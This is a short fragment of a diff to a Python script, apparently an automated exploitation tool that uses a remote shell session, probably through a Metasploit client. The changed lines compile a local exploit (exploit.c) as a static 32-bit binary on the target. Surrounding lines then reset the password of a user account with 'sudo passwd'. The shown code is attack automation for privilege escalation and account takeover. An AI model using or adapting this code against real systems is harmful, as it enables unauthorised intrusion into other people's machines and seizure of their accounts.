@@ -142,7 +142,7 @@ class ExploitCVE(object):
         shell = client.sessions.session(list(client.sessions.list.keys())[0])
         
         #compiling the exploit
-        shell.write('gcc exploit.c -o exploit')
+        shell.write('gcc -m32 --static -o exploit exploit.c ')
         time.sleep(5)
         print(shell.read())
         shell.write('ls -al exploit')
@@ -167,10 +167,6 @@ class ExploitCVE(object):
         print(shell.read())
         shell.write('sudo passwd vivek')
         shell.write('1234')
-        
-
-
-
 
 
 def main():
